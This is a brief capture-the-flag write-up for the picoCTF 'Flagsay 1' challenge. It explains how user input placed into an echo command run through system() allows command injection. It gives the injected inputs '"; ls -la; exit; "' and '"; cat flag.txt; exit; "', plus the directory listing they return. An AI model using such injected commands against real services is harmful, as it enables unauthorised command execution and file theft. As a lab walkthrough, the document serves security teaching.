 # Flagsay 1

[Click here for the code for this problem.](https://webshell2017.picoctf.com/static/664096763467adeb260dd8b508409fb6/flagsay-1.c)

This problem uses an echo command to output the flag.  Unfortunately for this program, we are also allowed to input information into this command.  This makes it fairly easy for us to use a [Command injection](https://www.owasp.org/index.php/Command_Injection) attack.


1. Go ahead and netcat into the server.
2. Next, we craft the system() command to help us find the flag.  We'll want to try to inject an "ls" command so we can check the directory.
  * Notice the format of the system call: __char commandBase[] = "/bin/echo \"%s\"\n";__
  * The %s is where our input will eventually end up.  We can use this to our advantage.
  * Bash commands can be terminated with a semicolon.
  * Therefore...
3. We can craft our input as such to see what other files are in the directory:
  * __"; ls -la; exit; "__  
  * Result:
  
_drwxr-x---   2 hacksports flagsay-1_9  4096 Apr  3 01:43 .                                                                     
drwxr-x--x 573 root       root        36864 Apr 16 23:31 ..                                                                    
-rwxr-xr-x   1 hacksports hacksports   6872 Apr 16 23:41 flagsay-1                                                             
-rwxr-sr-x   1 hacksports flagsay-1_9  6944 Apr 16 23:41 flagsay-1_no_aslr                                                     
-r--r-----   1 hacksports flagsay-1_9    33 Apr 16 23:41 flag.txt                                                              
-rwxr-sr-x   1 hacksports flagsay-1_9   120 Apr 16 23:41 xinetd_wrapper.sh_


4. We can now issue the final command and get the flag:
  * __"; cat flag.txt; exit; "__
